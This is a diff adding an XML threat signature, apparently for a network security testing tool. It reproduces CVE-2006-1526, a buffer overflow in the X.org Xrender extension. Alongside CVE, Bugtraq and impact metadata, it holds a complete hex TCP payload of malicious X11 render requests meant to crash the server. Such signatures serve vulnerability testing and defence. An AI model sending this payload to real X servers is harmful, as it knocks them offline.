@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="X.org Xrender Buffer Overflow"/>
+    <EngDesc display="true" value="This threat causes  a crash in the X.org server by sending a malicious render packet.  X.org is a X11 server for linux that typically listens on port 6000."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="X11"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="X.org"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="X.org_X.org"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="X.org_X.org_6.8.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="https://bugs.freedesktop.org/show_bug.cgi?id=6642"/>
+    <CVEID display="true" value="CVE-2006-1526"/>
+    <bugtraqID display="true" value="17795"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID value="0000010b4ad4c29100c000a80001003c0a39c211" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632835665937418750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1148011725" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="X11destPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$X11destPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="6C000B0000001200100000004D49542D4D414749432D434F4F4B49452D310000DCC8124710B84FD5B19ED082CF350245620004000600000052454E44455200009B00030000000000030000009B010100352004000D0040024800000058025802352004000E0040024800000058025802352004000F00400248000000580258023520040010004002480000005802580235080400110040024800000058025802010009000A0040024800000000000000580258020000010023000000000800000C0000009B0406000C004002480000003800000001000000010000009B0406000B0040020A0040023800000001000000010000009B04060009004002110040023400000001000000010000009B040600010040020D0040023600000001000000010000009B040600030040020E0040023600000001000000010000009B040600050040020F0040023600000001000000010000009B0406000700400210004002360000000100000001000000080002000A0040029B1A070001FAAF0909004002000000000000FFFF00000000580258029B1A070001FAAF0901004002FF5F00000000FF5F00000000580258029B1A070001FAAF09030040020000FF5F0000FF5F00000000580258029B1A070001FAAF090500400200000000FF5FFF5F00000000580258029B1A070001FAAF090700400200000000FF5FFF5F00000000580258029B1A0700030000000B004002FFFFFFFFFFFFFFFF00000000580258029B0809000300000001004002000000000B0040020000000000000000C800C800900190019B0809000300000003004002000000000B004002000000000000000000000000900190019B0809000300000005004002000000000B0040020000000000000000C8000000900190019B0809000300000007004002000000000B00400200000000000000000000C800900190019B0A100003000000010040020B0040023400000000000000007D2C010000A00100002C010000FA00000064000000F40100002C010000FA000002C8017017F9019B0B0C0003000000030040020B0040020000000000000000409C640000006400000090013075960000001E000000C8019B0C180003000000050040020B004002000000000000000000009001000032000000B4010000320000008E0100007F000000C201000078000000C2010000B4000000F70100007C000000F4010000D90000001E020000ED000000F5010000FA00" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
